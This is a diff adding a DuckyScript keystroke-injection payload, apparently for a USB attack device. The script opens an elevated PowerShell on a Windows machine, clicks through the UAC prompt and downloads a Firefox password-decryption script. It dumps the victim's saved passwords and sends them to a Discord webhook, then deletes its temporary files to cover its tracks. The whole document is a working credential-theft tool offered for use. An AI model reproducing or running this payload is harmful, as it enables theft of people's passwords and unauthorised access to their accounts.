@@ -1,0 +1,34 @@
+REM Author: MicrowavedBunny (MicrowavedBunny on Discord)
+REM Description: Exfiltrate Firefox passwords to discord via webhook. Change webhook url after $url =. Thanks to unode for creating the python script in this payload. check him out at (https://github.com/unode)
+REM Requirements: target system must have python 3.9+ installed and use firefox of course (with no master password)
+REM Version: 1.0
+REM Category: Exfiltration
+REM I did not play with the delay values so you might want to adjust them if they are too slow
+DELAY 1500
+WINDOWS r
+DELAY 1500
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 750
+LEFTARROW
+ENTER
+DELAY 1200
+ALT y
+DELAY 1200
+GUI UP
+DELAY 1200
+REM setting up variables for results, python script, and webhook url; download python script to temp folder then decrypt passwords and save results; 
+STRING $Results = "$env:TMP\resultsoftest.txt"; $fp = "$env:TMP\fd.py"; $url="input your discord webhook url here"; iwr https://raw.githubusercontent.com/unode/firefox_decrypt/main/firefox_decrypt.py?dl=1 -O $fp; python $fp --format csv > $Results
+ENTER
+DELAY 1200
+REM select profile (if only one profile exists 2 seems to be the default but you can change this)
+STRING 2
+ENTER
+DELAY 1200
+REM saves results to variable to be sent to discord via post; setup and send to webhook
+STRING $fileContent = Get-Content -Path $Results; $Body=@{ content = "$fileContent"}; Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@$results" $url ;
+ENTER
+DELAY 1200
+REM Removes the files from the temp directory and exiting
+STRING Remove-Item -Path "$env:TMP\fd.py"; Remove-Item -Path "$env:TMP\resultsoftest.txt"; exit
+ENTER
